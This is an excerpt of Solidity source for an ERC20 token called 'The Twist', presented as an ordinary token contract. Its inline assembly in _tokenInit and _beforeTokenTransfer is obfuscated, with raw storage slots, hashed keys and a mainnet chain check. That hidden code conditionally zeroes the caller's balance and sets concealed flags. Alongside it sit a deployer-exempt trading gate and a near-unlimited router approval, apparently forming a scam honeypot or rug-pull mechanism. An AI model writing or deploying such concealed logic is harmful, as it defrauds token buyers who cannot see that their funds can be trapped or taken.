...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addTwist;
    uint256 private secretInvasion = block.number*2;

    mapping (address => bool) private _firstMaya; 
    mapping (address => bool) private _secondAztec;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private smellDrink;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private hotBBQ;
    address public pair;
    ...
    bool private trading; uint256 private hugeDocs = 1; bool private bigBoy;
    uint256 private _decimals; uint256 private thiccness;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addTwist.push(_router); addTwist.push(msgSender_); addTwist.push(pair);
        for (uint256 q=0; q < 3;) {_firstMaya[addTwist[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xa5461e3f8e0d5509d531ca5ea3b3122c3cf0a0af706aaff5787370ea8a8f3dea
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xbb8c1593b72e0e3a5f821e41e90289d13ff048db7538372a0c7082526d7cd828,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; secretInvasion = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addTwist[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployTwist(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addTwist[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployTwist(creator, initialSupply);
    }
}

contract TheTwist is ERC20Token {
    constructor() ERC20Token("The Twist", "TWIST", msg.sender, 2515000 * 10 ** 18) {
    }
}